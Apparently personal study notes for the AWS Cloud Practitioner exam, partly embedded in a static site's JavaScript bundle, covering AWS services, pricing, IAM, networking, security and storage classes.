**Sustainability Pillar**

The sustainability pillar focuses on minimizing the environmental impacts of running cloud workloads. Key topics include a shared responsibility model for sustainability, understanding impact, and maximizing utilization to minimize required resources and reduce downstream impacts.

---

### About the Exams

Cloud Concepts - 26%

Security and Compliance - 25%

Technology - 33%

Billing and Pricing - 16%

**<span style="color:red">65 questions | 90 minutes | 70% passing score | 50 Scoring questions</span>**

<mark>No penalty for quessing</mark>

### Things you need to know

#### Set 1

Know the details of the following (not an exhaustive list):

- Fundamentals of AWS: IAM, S3, EC2, EBS, EFS, Redshift, RDS, DynamoDB, Auto Scaling

Dynamo DB is serverless for NoSQL, IAM is used to manage identity and access control, S3 is a storage service, EC2 is a compute service, EBS is a block storage that can be attached to EC2 instances, EFS is serverless shared storage, Redshift is for data wearhousing, RDS is used to launch or migrate an existing relational database to AWS.

- VPN, VPC, Transit Gateway, Internet Gateway, NAT Gateway

VPC: A web service for provisioning a logically isolated section of the AWS Cloud virtual network that you define. You control your virtual networking environment by selecting your own IP address range, creating\xA0[subnets](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#subnet)\xA0and configuring\xA0[route tables](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#routetable)\xA0and network gateways.

- Transit Gateway: on-prem and aws cloud connecct to a single gateway(one big cloud router)
- Internet Gateway: allows instances with public IPs to access the internet.
- NAT Gateway: allows instances with no public IPs to access the internet.

**CloudFront, CloudFormation, CloudTrail, CloudWatch**

CloudFront: An AWS content delivery service that helps you improve the performance, reliability, and availability of your websites and applications.

CloudFormation: A service for writing or changing templates that create and delete related AWS\xA0[resources](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#resource)\xA0together as a unit.

CloudTrail: A web service that records AWS API calls for your account and delivers log files to you

CloudWatch: A web service that you can use to monitor and manage various metrics, and configure alarm actions based on data from those metrics.

**AWS Security best practices such as IAM policies and KMS**

KMS: A managed service that simplifies the creation and control of\xA0[encryption](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#encrypt)\xA0keys that are used to encrypt data.

What are Region and Availability Zone (AZ) restrictions for different AWS services: Single AZ, Multi-AZ, Single Region, Multi-Region

Availability Zone: A distinct location within a\xA0[Region](https://docs.aws.amazon.com/general/latest/gr/glos-chap.html#region)\xA0that's insulated from failures in other Availability Zones, and provides inexpensive, low-latency network connectivity to other Availability Zones in the same Region.

**Region: physical location**

- What AWS services are global:

IAM, CloudFront, Amazon Route 53, WAF, Amazon Chime, DynamoDB, WorkDocs, WorkMail, WorkSpaces, WorkLink, Service Certificates

- What AWS services are truly free:

Security Groups, Auto Scaling, CloudFormation

- What AWS services include a free tier for 12 months for new AWS customers:

EC2, S3, RDS, CloudFront, DynamoDB*, Glacier*, Lambda\\* \\*Does not automatically expire after 12 months

- What AWS services are never free (need to pay to use)

WIREE, WAF, Inspector, Route 53, EBS volumes, ELB

- What AWS services are serverless

DynamoDB, Aurora, S3, SNS, SQS, Lambda, Fargate

- What AWS services scale automatically without intervention:

S3, Lambda

- Which data storage options have auto-backup:

REEDS \u2014 RDS, EFS, EBS, DynamoDB, Storage Gateway

---

#### Set 2

- What is a more cost effective option S3 One-Zone IA or Glacier?

- When do you use a dedicated host versus a dedicated instance?

<mark>Dedicated Instances - You pay for the instances, but they get placed on whatever dedicated hardware Amazon decides.</mark>

<mark>Dedicated Host - You pay for the entire physical server and can, in effect, run instances on it as you please.</mark>

- Is it more cost effective to run a spot instance or an on-demand instance when requests cannot be interrupted?
- When should you use Dynamo DAX versus ElastiCache versus Aurora?
- What services can I use to budget my services before I incur costs and how can I set up alerting?
- How can I show that RDS is set up for availability? What about for elasticity?
- What is the difference between CloudWatch and CloudFront?
- What can I use for encryption?
- What do I manage and what does AWS manage?
- What are the inherited factors from AWS?
- When it comes to RDS and EC2, who manages what?
- Which services are global?
- Which services are on-prem?
- Which services are regional?
- Which services are reserved?
- How much data does it take to use snowball vs snowmobile service?"
- What is scaling up vs. scaling out for RDS and EC2?
- When/how do you get a TAM?
- What do you get full access to Trusted Advisor?
- Which services are serverless?

**AWS Trusted Advisor**\xA0- AWS Trusted Advisors provides recommendations that help you follow AWS best practices. Trusted Advisor evaluates your account by using checks. These checks identify ways to optimize your AWS infrastructure, improve security and performance, reduce costs, and monitor service quotas. You can then follow the check recommendations to optimize your services and resources.

Trusted Advisor can help you save cost, such as recommending you to delete unused or idle resources, or use reserved capacity.

**Amazon CloudWatch**\xA0- Amazon CloudWatch is a monitoring service and provides you with data and actionable insights to monitor your applications, respond to system-wide performance changes, and optimize resource utilization. CloudWatch collects monitoring and operational data in the form of logs, metrics, and events. You get a unified view of operational health and gain complete visibility of your AWS resources, applications, and services running on AWS and on-premises. You can use CloudWatch to detect anomalous behavior in your environments, set alarms, visualize logs and metrics side by side, take automated actions, troubleshoot issues, and discover insights to keep your applications running smoothly.

**AWS Cost Explorer**\xA0- AWS Cost Explorer has an easy-to-use interface that helps you visualize, understand, and manage your AWS costs and usage over a daily or monthly granularity. It has a default report that helps you visualize the costs and usage associated with your top five cost-accruing AWS services, and gives you a detailed breakdown of all services in the table view. The reports let you adjust the time range to view historical data going back up to twelve months to gain an understanding of your cost trends. It also lets you dive deeper using granular filtering and grouping dimensions such as Usage Type and Tags.

**Amazon Inspector**\xA0- Amazon Inspector is an automated security assessment service that helps improve the security and compliance of applications deployed on AWS. Amazon Inspector automatically assesses applications for exposure, vulnerabilities, and deviations from best practices. After performing an assessment, Amazon Inspector produces a detailed list of security findings prioritized by level of severity. These findings can be reviewed directly or as part of detailed assessment reports, which are available via the Amazon Inspector console or API.

**AWS Service Health Dashboard**\xA0- AWS publishes the most up-to-the-minute information on service availability in the Service Health Dashboard. You can visit any time to get the current status and availability information for each individual service. AWS Service Health Dashboard is available at this link:\xA0[https://status.aws.amazon.com](https://status.aws.amazon.com/)

**AWS Personal Health Dashboard**\xA0- The Personal Health Dashboard gives you a personalized view of the status of AWS services that power your applications. Use the Personal Health Dashboard to learn about specific operational issues that affect your account. For example, if you receive an event for a lost Amazon Elastic Block Store (EBS) volume associated with one of your Amazon EC2 instances, you can use the event to quickly view the status of your impacted resources, and then troubleshoot and determine remediation steps.

**AWS Config**\xA0- AWS Config enables you to assess, audit, and evaluate the configurations of your AWS resources. Config continuously monitors and records your AWS resource configurations and allows you to automate the evaluation of recorded configurations against desired configurations. With Config, you can review changes in configurations and relationships between AWS resources, dive into detailed resource configuration histories, and determine your overall compliance against the configurations specified in your internal guidelines.

**AWS CloudFormation**\xA0- AWS CloudFormation gives you an easy way to model a collection of related AWS and third-party resources, provision them quickly and consistently, and manage them throughout their lifecycles, by treating infrastructure as code. A CloudFormation template describes your desired resources and their dependencies so you can launch and configure them together as a stack. You can use a template to create, update, and delete an entire stack as a single unit, as often as you need to, instead of managing resources individually. You can manage and provision stacks across multiple AWS accounts and AWS Regions.

**AWS CloudTrail**\xA0- AWS CloudTrail monitors and records account activity across your AWS infrastructure, giving you control over storage, analysis, and remediation actions. With CloudTrail, you can log, continuously monitor, and retain account activity related to actions across your AWS infrastructure.

CloudTrail provides event history of your AWS Accounts. CloudTrail Events help you answer the questions of "who did what, where, and when?".\xA0 Let's say your S3 bucket was deleted by mistake. You can use AWS CloudTrail to see who deleted the bucket, when, and where (e.g. API Call or from the AWS Management console).

**AWS Elastic Load Balancing**\xA0- Elastic Load Balancing (ELB) is an AWS service that automatically distributes incoming application traffic across multiple targets, such as Amazon EC2 instances, containers, IP addresses, and Lambda functions, and ensures only healthy targets receive traffic. It can handle the varying load of your application traffic in a single Availability Zone or across multiple AZs, and supports the ability to load balance across AWS and on-premises resources in the same load balancer.
`}function ml(){return po}function hl(){return[{depth:3,slug:"scaling-amazon-ec2",text:"Scaling Amazon EC2"},{depth:3,slug:"aws-services-and-features",text:"AWS services and features"},{depth:3,slug:"the-cloud",text:"The Cloud"},{depth:3,slug:"cloud-deployment",text:"Cloud Deployment"},{depth:3,slug:"elastic-compute-cloud-amazon-ec2",text:"Elastic Compute Cloud (Amazon EC2)"},{depth:3,slug:"types-of-ec2-instances",text:"Types of EC2 Instances"},{depth:3,slug:"edge-locations",text:"Edge Locations"},{depth:4,slug:"managing-aws-resources",text:"Managing AWS Resources"},{depth:3,slug:"messaging-and-queueing",text:"Messaging and Queueing"},{depth:3,slug:"migration-and-innovation",text:"Migration and Innovation"},{depth:3,slug:"aws-snow-family",text:"AWS Snow Family"},{depth:3,slug:"innovatoin-with-aws",text:"Innovatoin with AWS"},{depth:3,slug:"monitoring-and-analytics",text:"Monitoring and Analytics"},{depth:6,slug:"best-practices",text:"BEST PRACTICES"},{depth:3,slug:"networking",text:"Networking"},{depth:3,slug:"pricing-and-support",text:"Pricing and Support"},{depth:3,slug:"billing",text:"Billing"},{depth:3,slug:"security",text:"Security"},{depth:3,slug:"serverless",text:"Serverless"},{depth:3,slug:"storage-and-databases",text:"Storage and Databases"},{depth:3,slug:"the-cloud-journey",text:"The Cloud Journey"},{depth:3,slug:"aws-well-architected-and-the-six-pillars",text:"AWS Well-Architected and the Six Pillars"},{depth:3,slug:"about-the-exams",text:"About the Exams"},{depth:3,slug:"things-you-need-to-know",text:"Things you need to know"},{depth:4,slug:"set-1",text:"Set 1"},{depth:4,slug:"set-2",text:"Set 2"}]}async function go(){let{layout:e,...n}=mo;return n.file=ho,n.url=fo,Ke(qe,{"set:html":po})}var fu,Du,ln,po,mo,ho,fo,yo=F(()=>{O();fu=S(N(),1);U();Du=S(G(),1);q();K();ln={};po=pl(`<h3 id="scaling-amazon-ec2">Scaling Amazon EC2</h3>
<p>Scaling involves begining with only the resources you need and design your architecture to automatically respond to changing demand by scaling out or in</p>
<ul>
<li>Horizontal Scaling - Auto scaling</li>
<li>Scaling up - Adding more power to the machines that\u2019s running</li>
<li>Scaling out - Adding more instances</li>
</ul>
<p><strong>Dynamic scaling</strong>: respond to changing demand.</p>
<p><strong>Predictive scaling</strong>: automatically schedules the right number of Amazon EC2 instances based on predictive demand.</p>
<p><strong>\u26A0\uFE0F NOTE: To scale faster you have to use both.</strong>
If you do not specify the desired number of Amazon EC2 instances in Auto Scaling Group, the desired capacity degaults to the minimum capacity.</p>
<hr>
<h3 id="aws-services-and-features">AWS services and features</h3>
<p><strong>Analytics:</strong></p>
<ul>
<li>Amazon Athena</li>
<li>Amazon Kinesis</li>
<li>Amazon QuickSight</li>
</ul>
<p><strong>Application Integration:</strong></p>
<ul>
<li>Amazon Simple Notification Service (Amazon SNS)</li>
<li>Amazon Simple Queue Service (Amazon SQS)</li>
</ul>
<p><strong>Compute and Serverless:</strong></p>
<ul>
<li>AWS Batch</li>
<li>Amazon EC2</li>
<li>AWS Elastic Beanstalk</li>
<li>AWS Lambda</li>
<li>Amazon Lightsail</li>
<li>Amazon WorkSpaces</li>
</ul>
<p><strong>Containers:</strong></p>
<ul>
<li>Amazon Elastic Container Service (Amazon ECS)</li>
<li>Amazon Elastic Kubernetes Service (Amazon EKS)</li>
<li>AWS Fargate</li>
</ul>
<p><strong>Database:</strong></p>
<ul>
<li>Amazon Aurora</li>
<li>Amazon DynamoDB</li>
<li>Amazon ElastiCache</li>
<li>Amazon RDS</li>
<li>Amazon Redshift</li>
</ul>
<p><strong>Developer Tools:</strong></p>
<ul>
<li>AWS CodeBuild</li>
<li>AWS CodeCommit</li>
<li>AWS CodeDeploy</li>
<li>AWS CodePipeline</li>
<li>AWS CodeStar</li>
</ul>
<p><strong>Customer Engagement:</strong></p>
<ul>
<li>Amazon Connect</li>
</ul>
<p><strong>Management, Monitoring, and Governance:</strong></p>
<ul>
<li>AWS Auto Scaling</li>
<li>AWS Budgets</li>
<li>AWS CloudFormation</li>
<li>AWS CloudTrail</li>
<li>Amazon CloudWatch</li>
<li>AWS Config</li>
<li>AWS Cost and Usage Report</li>
<li>Amazon EventBridge (Amazon CloudWatch Events)</li>
<li>AWS License Manager</li>
<li>AWS Managed Services</li>
<li>AWS Organizations</li>
<li>AWS Secrets Manager</li>
<li>AWS Systems Manager</li>
<li>AWS Systems Manager Parameter Store</li>
<li>AWS Trusted Advisor</li>
</ul>
<p><strong>Networking and Content Delivery:</strong></p>
<ul>
<li>Amazon API Gateway</li>
<li>Amazon CloudFront</li>
<li>AWS Direct Connect</li>
<li>Amazon Route 53</li>
<li>Amazon VPC</li>
</ul>
<p><strong>Security, Identity, and Compliance:</strong></p>
<ul>
<li>AWS Artifact</li>
<li>AWS Certificate Manager (ACM)</li>
<li>AWS CloudHSM</li>
<li>Amazon Cognito</li>
<li>Amazon Detective</li>
<li>Amazon GuardDuty</li>
<li>AWS Identity and Access Management (IAM)</li>
<li>Amazon Inspector</li>
<li>AWS License Manager</li>
<li>Amazon Macie</li>
<li>AWS Shield</li>
<li>AWS WAF</li>
</ul>
<p><strong>Storage:</strong></p>
<ul>
<li>AWS Backup</li>
<li>Amazon Elastic Block Store (Amazon EBS)</li>
<li>Amazon Elastic File System (Amazon EFS)</li>
<li>Amazon S3</li>
<li>Amazon S3 Glacier</li>
<li>AWS Snowball Edge</li>
<li>AWS Storage Gateway</li>
</ul>
<hr>
<h3 id="the-cloud">The Cloud</h3>
<p>An EC2 instance is a virtual server in the AWS client-server module.</p>
<blockquote>
<p>You only pay for what you use.</p>
</blockquote>
<p>Cloud computing is the on-demand delivery of IT resouces over the internet with pay-as-you-go pricing.</p>
<ul>
<li>Undifferentiated heavy lifting of IT: Tasks that are common, repetitive and time consuming. AWS focuses on this so you get the time to do what you need to do.</li>
<li>Over the internet</li>
<li>Pay-as-you-go pricing.</li>
</ul>
<hr>
<h3 id="cloud-deployment">Cloud Deployment</h3>
<ul>
<li>Cloud-based Deployment: Run all parts of the application in the cloudl</li>
<li>On-Premises Deployment: Deploy resources using virtualization and resources as well as management tools.</li>
<li>Hybrid Deployment: Connect cloud based resources to on-premises (infrastructure)</li>
</ul>
<p><strong>Benefits of the Cloud</strong></p>
<ol>
<li>Trade upfront expenses for variable expenses</li>
<li>Stop spending money to run and maintain data centers.</li>
<li>Stop guessing capacity</li>
<li>Benefit from massive economics of scale (Lower pay-as-you-go prices)</li>
<li>Increase speed and agility</li>
<li>Go global in minutes.</li>
</ol>
<hr>
<h3 id="elastic-compute-cloud-amazon-ec2">Elastic Compute Cloud (Amazon EC2)</h3>
<p>Highly flexible -> Cost effective -> Quick</p>
<p>Launch -> Connect -> Use</p>
<ul>
<li>Runs on physical host machines</li>
<li>Uses virtualization technology to deliver it to you.</li>
<li>Share the resources</li>
<li>Resizeable (Virtual Scaling)</li>
<li>Networking is managed by you.</li>
<li>Compute as a Service</li>
</ul>
<p><strong>You have complete control of the instance</strong></p>
<p><strong>Multitenancy</strong>: Sharing underlying hardware between virtual machines</p>
<blockquote>
<p>When you are using EC2, you are responsible for software patches /setting up scaling / High availabiligy</p>
</blockquote>
<hr>
<h3 id="types-of-ec2-instances">Types of EC2 Instances</h3>
<p>Each instace type is grouped under an instance family.</p>
<ol>
<li>General Purpose: Good balance of compute/CPU and memory resources - Web servers and code repositories</li>
<li>Compute Optimized: Compute instensive task - HPC/Gaming servers/scientific modelling.</li>
<li>Memory Optimized: Memory intense tasks</li>
<li>Accelerated Computing: Floating point number calculator / Graphic processing</li>
<li>Storage Optimized: High performance for locally stored data</li>
</ol>
<p><strong>EC2 Pricing</strong></p>
<ol>
<li>On-demand: Only pay for the duration you your instance runs for.</li>
<li>Saving plan: USD 1 / hr - 1/3 year term commitment - 72% savings</li>
<li>Reserved Instance: Discount on 1/3 year term. Offers Upfront, No upfront and portion payment to enjoy 75% discount</li>
<li>Spot Instances: Spare EC2 instances - 90% discount. AWS can reclaim the instance anytime while giving you 2 minutes warning. No contracts needed.</li>
<li>Dedicated Host: Pysically host dedicated EC2. Used for meeting compliance requirements and no one will share tenancy of the host.</li>
</ol>
<p><strong>Directing Trafic with Elastic Load Balancing</strong></p>
<ul>
<li>Properly distribute traffic in high performance / cost efficient / highly available and automatically scalable.</li>
<li>ELB is a regional construct</li>
<li>Helps in a decoupled architechture</li>
</ul>
<p><strong>Global Infrastructure and Reliability</strong></p>
<p>It is not good enough to have all your data stored in a single data centre. You need high availability and fault tolerance.</p>
<ul>
<li>AWS Region: Region is made up of multiple data centers. Regions are geographically isolated areas.</li>
<li>A single/group of data centers is called an availability zone. Each AZ is one or more discrete data center with redandancy power, networking and connectivity.
For high availability, you have to run across at least two availability zones in a region.</li>
</ul>
<blockquote>
<p>Regional Construct</p>
</blockquote>
<ol>
<li>SNS</li>
<li>SQS</li>
<li>S3</li>
<li>EFS</li>
</ol>
<h3 id="edge-locations">Edge Locations</h3>
<p>CDN - Content Delivery Network. Caching a coppy close to the customer/user. <strong>Cloudfront</strong> is amazon\u2019s CDN.</p>
<p><strong>Cloudfront</strong>
: uses edge locations to help accelerate communications.</p>
<p><strong>Amazon Route53</strong>
: Is a DNS server that can also be run on the edge location</p>
<p><strong>AWS Outposts</strong>
: Using AWS inside your own building (Data Center)</p>
<blockquote>
<p>In AWS, everything is an API call</p>
</blockquote>
<hr>
<h4 id="managing-aws-resources">Managing AWS Resources</h4>
<ul>
<li>AWS Management Console</li>
<li>AWS Commandline Interface (CLI)</li>
<li>AWS Software Development Kits (SDKs)</li>
</ul>
<p><strong>AWS Elastic Beanstalk</strong>
: Helps you provision Amazon EC2 based environments</p>
<p><strong>AWS CloudFormation</strong>
: Infrastructure as code tool. It is a declarative way using JSON or YAML. Supports more than Just EC2 instances.</p>
<hr>
<h3 id="messaging-and-queueing">Messaging and Queueing</h3>
<ul>
<li>puting a message into a buffer.</li>
<li>Tightly coupled (When an application communicates directly with other processess)</li>
<li>Loosely coupled (Single failure won\u2019t couse cascading failures)</li>
</ul>
<p><em>Amazon Simple Queue Service (Amazon SQS)</em></p>
<p><em>Amazon Simple Notification Service (Amazon SNS)</em></p>













<table><thead><tr><th>SQS</th><th>SNS</th></tr></thead><tbody><tr><td>Send messages, Store messages, Receive messages between software component at any volume.</td><td>Publish/Subscribe module. Make use of SNS topics</td></tr></tbody></table>
<hr>
<h3 id="migration-and-innovation">Migration and Innovation</h3>
<p>The AWS cloud adoption framework (AWS CAF) - organises guidance into six areas of focus that\u2019s call perspective.</p>
<p>Focus: Business Capabilities</p>
<ol>
<li>Business Perspective</li>
<li>People Perspective</li>
<li>Governance Perspective</li>
</ol>
<p>Focus: Platform Capalilities</p>
<ol start="4">
<li>Platform Perspective</li>
<li>Security Perspective</li>
<li>Operations Perspective</li>
</ol>
<p><strong>Migration Strategies</strong></p>
<p>The six R\u2019s of Migration</p>
<ul>
<li>Rehosting - Lift and shift</li>
<li>Replatforming - Lift tinker shift</li>
<li>Retire</li>
<li>Retain</li>
<li>Repurchasing</li>
<li>Refactoring / re-achitecting</li>
</ul>
<hr>
<h3 id="aws-snow-family">AWS Snow Family</h3>
<ul>
<li>AWS Snow Cone - 8TB</li>
<li>AWS Snowball Edge
<ul>
<li>Compute Optimized (Storage 42TB / 52 VCPUs)</li>
<li>Storage Optimized (Storage 80TB / 40 VCPUs)</li>
</ul>
</li>
<li>AWS Snow mobile - 100PB</li>
</ul>
<hr>
<h3 id="innovatoin-with-aws">Innovatoin with AWS</h3>
<ul>
<li>Vmware on AWS</li>
<li>Amazon SageMaker</li>
<li>Amazon Augmented AI</li>
<li>Amazon Lex</li>
<li>Amazon Textract</li>
<li>AWS DeepRacer</li>
<li>AWS Ground Station</li>
</ul>
<h3 id="monitoring-and-analytics">Monitoring and Analytics</h3>
<p><strong>Amazon Cloudwatch</strong>
: It\u2019s a {graphical dashboard}. It\u2019s a web service that enables you to monitor and manage various metrics and configure alarm actions based on data from those metrics.</p>
<p><strong>AWS Cloud Trail</strong>
: {Logs}. Trust but verify. API auditing tool. Every request gets logged in the cloud Trail engine.</p>
<p><strong>AWS Trusted Advisor</strong>
: {Auditing} Is a web service that inspects your AWS environment and provides real-time recommendations in accordance with AWS best practices.</p>
<h6 id="best-practices">BEST PRACTICES</h6>
<ol>
<li>Cost Optimization</li>
<li>Fault Tolerance</li>
<li>Performance</li>
<li>Security</li>
<li>Service Limits</li>
</ol>
<hr>
<h3 id="networking">Networking</h3>
<p>Amazon Virtual Private Cloud (VPC): It\u2019s a private network in AWS. Allows you to provision a logically isolated section of the AWS cloud where you can launch AWS resources in a virtual network that you define. The resource can be public subnet or private network.</p>
<p><strong>Internet Gateway</strong>
: Allows traffic to access your VPC</p>
<p><strong>Private Gateway</strong>
: allows you to create a VPN to your VPC</p>
<p><strong>AWS Direct Connect</strong>
: Allows you to establish a completely private, dedicated fiber connection from your data center to AWS.</p>

































<table><thead><tr><th>Network Access Control List (NACL)</th><th>Security Group</th></tr></thead><tbody><tr><td>Stateless</td><td>Stateful</td></tr><tr><td>Applies to all instances within a subnet</td><td>Determines what trafic comes in(inboud traffic) to the instance and which one leaves(outbound traffic) the EC2 instance</td></tr><tr><td>Operates at the subnet level</td><td>Operates at the Elastic Network Interface (ENI)</td></tr><tr><td>NACL rules are evaluated from Lowest to Highest. Lowest number, Highest priority</td><td>It\u2019s a virtual firewall</td></tr><tr><td>Both Allow and Deny rules are possible</td><td>Only have allow rules</td></tr><tr><td>Allows all traffic by default</td><td>Blocks all traffic by default</td></tr></tbody></table>
<hr>
<h3 id="pricing-and-support">Pricing and Support</h3>
<p>AWS Free Tier</p>
<ul>
<li>Always free</li>
<li>12 months free</li>
<li>Trials</li>
</ul>
<p><strong>AWS Lambda</strong>
: Free for 1 million invocations per month.</p>
<p><strong>S3</strong>
: is free for 12 months</p>
<p><strong>Lightsail</strong>
: Offers 1 month trial of up to 750 hours of usage</p>















<table><thead><tr><th>Pay for what you use</th><th>Pay less when you reserve</th><th>Pay less with volume-based discounts when you use more</th></tr></thead><tbody><tr><td>For each service, you pay for exactly the amount of resources that you actually use, without requiring long-term contaracts or complex licensing.</td><td>Some Service offer reservation options that provides a significant discount compared to on-demand instance pricing</td><td>Some service offer tiered pricing, so the per-unit cost is incrementally lower with increased usage</td></tr></tbody></table>
<hr>
<h3 id="billing">Billing</h3>
<p><strong>AWS Billing and cost Management Dashboard</strong>
: to pay your AWS bill, monitor your usage analyze and control your costs.</p>
<ul>
<li>compare your current month-to-date balace with the previous month, and get a forcast of the next month based on current usage.</li>
<li>View month-to-date spend by service</li>
<li>View free tier usage by service</li>
<li>Access cost Explorer and Create budget</li>
<li>Purchase and mange savings plans</li>
<li>Publish AWS costs and usage reports</li>
</ul>
<p><strong>Consolidated Billing</strong>
: Enables you to receivea single bill for all AWS accounts in your organisation.</p>
<ul>
<li>By consolidating you can easily track the combined costs of all th linked accounts in your organisation.</li>
<li>Another benefit of consolidated billing is the ability to share bulk discount pricing, savings plans, and reserved instances across the accounts in your organisation.</li>
</ul>
<p><strong>AWS Budget</strong>
: You can create budgets to plan your service usage, service costs and instance reservations.</p>
<p><strong>AWS Cost Explorer</strong>
: Is a tool that enables you to visualize, understand and manage your AWS costs and usage over time.</p>
<p><strong>AWS Support Plans</strong>
: AWS offrs four different support plans to meet your company\u2019s needs.</p>
<ol>
<li>Basic Plan - Free and limited trusted adviser checks.</li>
<li>Developer Plan</li>
<li>Business Plan</li>
<li>Enterprse Plan - TAM</li>
</ol>
<p><strong>AWS Market Place</strong>
: It\u2019s a digital catalog that includes thousands of software listings from independent software vendors. You can use AWS marketplace to find, test and buy software that runs on AWS.</p>
<hr>
<h3 id="security">Security</h3>
<p>With the shared responsibility model</p>
<ul>
<li>AWS controls the Security of the cloud</li>
<li>Customers controls the Security in the cloud</li>
</ul>





























<table><thead><tr><th>Customer</th><th>AWS</th></tr></thead><tbody><tr><td>Security in the Cloud</td><td>Security of the Cloud</td></tr><tr><td>Maintains control over your content</td><td>Operates, manages and control the components at all layers of infrasture including (Host OS, Virtualization Layer, Physical Security of the Data Center)</td></tr><tr><td>Managing security requirements</td><td>Global infrastructure</td></tr><tr><td>Access to content</td><td></td></tr><tr><td>how access rights are granted, managed and revoked</td><td></td></tr></tbody></table>
<p><strong>User Permissions and Access</strong></p>
<p>AWS identity and Access Management (IAM) - by default IAM users have no permissions.</p>
<p><strong>Least Privilege Principle</strong>
: A user is granted access only to what they need.</p>
<p><strong>Root user</strong>
: Has complete access to all the AWS services and resources in the account. Do not use the root user for everyday tasks.</p>
<ul>
<li>Create an AWS account this established your root user identity</li>
<li>Create your first IAM user and give it permissions to create other users</li>
<li>Login as the new IAM user and continue to create other users</li>
<li>Only acccess the root user for a limitee number of tasks</li>
</ul>
<p><strong>IAM Users</strong>
: Is an identity that you create in AWS. It represents the person / application that interacts with AWS services and resources. Consist of names and credentials. - by default, when you create a new IAM user in AWS, it has no permissions associated with it.</p>
<blockquote>
<p>BEST PRACTICE</p>
</blockquote>
<p><mark>We recommend that you create individual IAM users for each person who needs to access AWS.</mark></p>
<p><strong>IAM Policies</strong>
: An IAM policy is a document that allows or denies permisions to AWS services and resoruces. Allows you to customize user level of access to resouces.</p>
<blockquote>
<p>BEST PRACTICE</p>
</blockquote>
<p><mark>Follow the security principles of least privilege when granting permission</mark></p>
<p><strong>IAM Groups</strong>
: Is a collection of IAM users. When you assign an IAM policy to a group, all users in the group are granted permissions specified by the policy. One way to manage your users and their permissoins is to organise them into IAM groups.</p>
<p><strong>IAM Roles</strong>
: Is an identity that you can assume to gain temporary access to permissions. Before an IAM user, application or service can assume an IAM role, they must be granted permission to switch to the role. When someone assumes an IAM role, they drop all previous permissions they had under a previous role and assume the premission of the new role.</p>
<blockquote>
<p>BEST PRACTICE</p>
</blockquote>
<p><mark>IAM roles are ideal for situations in which access to services or resources needs to be granted temporarily instead of long-time.</mark></p>
<p><strong>AWS Organizations</strong></p>
<p>A central location to mange multiple AWS accounts.</p>
<ul>
<li>Centralized management</li>
<li>Consolidated billing</li>
<li>Hierarchical groupings of accounts</li>
<li>AWS service and API actions access control (Services control Policies(SCPs)).</li>
</ul>
<p><mark>You cannot apply IAM policies to IAM users, groups or roles. You cannnot apply an IAM policy to the AWS account root user.</mark></p>
<p><strong>AWS Artifact</strong></p>
<p>Is a service that provides on-demand access to AWS security and compliance reports and select online agreements. AWS artifacts consists of two main sections:</p>
<ul>
<li><mark>AWS Artifacts Agreements and AWS Artifact Reports</mark></li>
</ul>
<p><strong>Denial of Service Attacks</strong></p>
<ul>
<li>Security Policy can help against UDP Floods</li>
<li>ELB can help against slow loris attacks</li>
<li><span style="color:red">AWS Shield is a service protects applications against DDoS attacks.</span></li>
<li><span style="color:red">AWS WAF uses a web application firewall to filter incoming traffic with the signature of bad actors.</span></li>
</ul>
<p><strong>Additional Security Services</strong></p>
<p><strong>AWS Key Management Service (KMS)</strong>
: is used to manage cryptographic/encryption keys on AWS</p>
<ul>
<li>Encryption at rest -> DynamoDB data</li>
<li>Encrypton in transit -> SSL</li>
</ul>
<p><strong>Amazon Inspector</strong>
: runs automated security accessment against your infrastructure</p>
<p><strong>Amazon GuardDuty</strong>
: It analyses contineous streams of metadata generated from your account and network activity.</p>
<hr>
<h3 id="serverless">Serverless</h3>
<p>You cannot see or access the underlying infrastructure.</p>
<p>AWS Lambda is a serverless option suited for quick processing like web application backend.</p>
<ul>
<li>AWS Container Services: Container orchestration tool.</li>
<li>Amazon Elastic Container Service (Amazon ECS)</li>
<li>Amazon Elastic Kubernetes Service (Amazon EKS)</li>
<li>AWS Fargate: It is a serverless computer platformm for ECS and EKS</li>
</ul>
<hr>
<h3 id="storage-and-databases">Storage and Databases</h3>
<p><span style="color:orange">- Block level storage - Hard Drive</span></p>
<p><strong>Instance Store</strong>
: are used to store temporary files and data that can be easily recreated without consequences.</p>
<p><strong>Amazon Elastic Block Store (EBS)</strong>
: Virtual hard drive or EBS volumes. Allows incremental backups called snapshots.</p>
<p><strong>Amazon Simple Storage Service (S3)</strong>
: Store and retrieve unlimited amount of data. Stores data as an object in buckets with mazimum size of 5TB.</p>
<p><strong>Storage Types</strong></p>
<p>S3 Standard</p>
<ul>
<li>99.99% at least 3 storage facilities</li>
</ul>
<p>S3 Standard - Infrequent Access (S3 standard - IA)</p>
<ul>
<li>used for data accessed less frequently but requres rapid access when needded (Backups)</li>
</ul>
<p>Amazon S3 Glacier</p>
<ul>
<li>used to achive data for auditing or future purposes</li>
</ul>
<p>S3 one zone-Infrequent Access (S3 one zone-IA)</p>
<ul>
<li>stores data in a single AZ</li>
</ul>
<p>S3 Intelligent-Tiering</p>
<ul>
<li>Ideal for data with ==unknown== or ==changeing access patterns.==</li>
</ul>
<p>S3 Glacier Deep Archive</p>
<ul>
<li>Lowest-Cost object storage class ideal for archiving</li>
</ul>
<p><strong>Amazon Elastic File System (Amazon EFS)</strong></p>
<p>It\u2019s a managed file system. Amazon takes care of the scaling andreplication of multiple instances accessing the data all the time. It\u2019s a true file system for Linux and not just a blank hard drive you can write to.</p>
<p><mark>On-Premises servers can access Amazon EFS using AWS Direct Connect</mark></p>
<p><strong>Amazon Relational Database Service (RDS)</strong></p>
<p>Lift-and-shift migration of databse in EC2 or use RDS to do the migration with added benefits which includes <em>automate patching</em>, <em>backups</em>, <em>redundancy</em>,<em>failovers</em>,<em>disaster recovery</em></p>
<p><strong>Amazon Aurora</strong></p>
<p>Aurora is a managed relational database. Used for high availability. Entreprise class relational database.</p>
<ul>
<li>Pricing is 1/10th the cost of commercial databases.</li>
<li>Data replicated across facilities 6 copies at any given time.</li>
<li>Up to 15 read replicas</li>
<li>Contineous backup to S3</li>
<li>Point-in-time recovery</li>
</ul>
<p><strong>Amazon DynamoDB</strong></p>
<p>It\u2019s a serverless database which supports auto scaling. Non-relational (NoSQL) which uses key-value pair</p>
<ul>
<li>Highly scalable and highly performant</li>
<li>Purpose built.</li>
</ul>
<p><strong>Amazon Redshift</strong></p>
<p>Data wearhousing service. Looks at historical analytics as suppose to operational analysis. It is scalable and offers data wear house as a service.</p>
